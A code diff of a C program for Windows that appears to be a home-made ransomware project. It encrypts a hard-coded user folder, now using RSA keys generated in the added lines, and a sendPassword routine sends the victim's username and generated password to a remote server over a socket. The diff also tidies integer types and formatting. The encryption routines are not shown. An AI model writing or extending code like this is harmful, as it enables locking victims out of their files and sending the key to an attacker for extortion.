@@ -15,17 +15,18 @@ _________ .__                  .__    .__               _________         __
 
 #pragma comment(lib,"ws2_32.lib") // Code::Blocks->Settings->Compiler->Linker->Other linker options: => "-lws2_32";
 
+#include "../../RSA/rsa.h"
 #include "encrypt.h"
 
-char *createPassword(const int lengthPass);
+char *createPassword(const size_t lengthPass);
 void createMessage(const char* userName);
 int sendPassword(const char *userName, const char *passwd);
 
-
 int main(int argc, char *argv[])
 {
-    static const int USER_NAME_LENGTH = 256;
-    static const int USER_PASSWORD_LENGTH = 256;
+    static const size_t USER_NAME_LENGTH = 256;
+    static const size_t USER_PASSWORD_LENGTH = 256;
+    const char *PRIME_SOURCE_FILE = "primes.txt";
 
     //Get username
     char userName[USER_NAME_LENGTH+1];
@@ -44,14 +45,19 @@ int main(int argc, char *argv[])
     //char basePath[] = "C:/Users/Zelra/Desktop/MyFile"; // Path for the base folder
     char basePath[] = "C:/Users/maxim/Desktop/MyFile";
     //fileEncrypt(fileptr);
-    folderEncrypt(basePath);
+
+    struct public_key_class pub;
+    struct private_key_class priv;
+    rsa_gen_keys(&pub, &priv, PRIME_SOURCE_FILE);
+
+    folderEncrypt(basePath, &pub);
 
     free(passwd);
     return 0;
 }
 
 //Generate Password
-char *createPassword(const int lengthPass)
+char *createPassword(const size_t lengthPass)
 {
     static const char passBuilder[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
     char *createdPasswd = NULL;
@@ -63,7 +69,7 @@ char *createPassword(const int lengthPass)
         exit(-1);
     }
 
-    for (int i = 0; i < lengthPass; i++)
+    for (size_t i = 0; i < lengthPass; i++)
     {
         createdPasswd[i] = passBuilder[(rand() % (strlen(passBuilder)) + 1)] ;
     }
@@ -110,10 +116,9 @@ int sendPassword(const char *userName, const char *passwd){
 	char ip[100];
 	struct hostent *he;
 	struct in_addr **addr_list;
-	int i;
 
 	printf("\nInitialising Winsock...");
-	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
 		printf("Failed. Error Code : %d",WSAGetLastError());
 		return 1;
@@ -140,7 +145,7 @@ int sendPassword(const char *userName, const char *passwd){
 	printf("Socket created.\n");
 
     // Lookup domain name
-    if ( (he = gethostbyname( hostname ) ) == NULL)
+    if ((he = gethostbyname( hostname ) ) == NULL)
     {
         //gethostbyname failed
         printf("gethostbyname failed : %d" , WSAGetLastError());
@@ -149,7 +154,7 @@ int sendPassword(const char *userName, const char *passwd){
 
     // Cast the h_addr_list to in_addr , since h_addr_list also has the ip address in long format only
     addr_list = (struct in_addr **) he->h_addr_list;
-    for(i = 0; addr_list[i] != NULL; i++)
+    for(size_t i = 0; addr_list[i] != NULL; i++)
     {
         //Return the first one;
         strcpy(ip , inet_ntoa(*addr_list[i]) );
@@ -172,7 +177,7 @@ int sendPassword(const char *userName, const char *passwd){
 	puts("Connected");
 
 	// Send some data
-	if( send(s , message , strlen(message) , 0) < 0)
+	if (send(s , message , strlen(message) , 0) < 0)
 	{
 		puts("Send failed");
 		closesocket(s);
@@ -181,7 +186,7 @@ int sendPassword(const char *userName, const char *passwd){
 	puts("Data Send\n");
 
 	// Receive a reply from the server
-	if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
+	if ((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
 	{
 		puts("recv failed");
 	}
